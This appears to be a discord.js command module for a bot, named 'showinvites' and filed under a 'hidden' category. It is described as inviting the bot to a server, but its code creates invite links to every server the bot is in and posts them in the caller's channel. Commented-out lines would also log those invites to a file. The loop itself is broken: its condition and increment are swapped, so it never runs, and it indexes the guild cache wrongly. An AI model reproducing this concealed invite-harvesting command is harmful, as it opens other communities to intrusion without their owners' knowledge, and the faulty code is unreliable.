const { MessageEmbed, MessageActionRow, MessageButton } = require("discord.js");

module.exports = {
    config: {
        name: "showinvites",
        aliases: [],
        category: "hidden",
        description: "Invite the bot to your server.",
        accessableby: "Members"
    },
    // function invitewrite(msg, server, chatroom) { fs.appendFileSync('./serverinvites.txt', msg+'\n', function (err) { if (err) throw err;});}; // invitewrite, Serverwise
    // invitewrite(String(message.channel.guild.name) + " Invite: " + String(`${invite}`), message.channel.guild.name, message.channel.name);
    run: async (client, message, args) => {
    console.log(`${client.guilds.toString()}`);
    console.log(`${client.guilds.cache}`);
    console.log(`${client.guilds.cache.size}`);
        for(guild=0;guild++;guild<=client.guilds.cache.size){
          var invite = await client.guilds.cache[guild].createInvite({maxAge: 10 * 60 * 1000, maxUses: 3 });
          message.channel.send(`Invite link for ${client.guilds.cache[guild]} : ${invite}`);
        }
    }
}
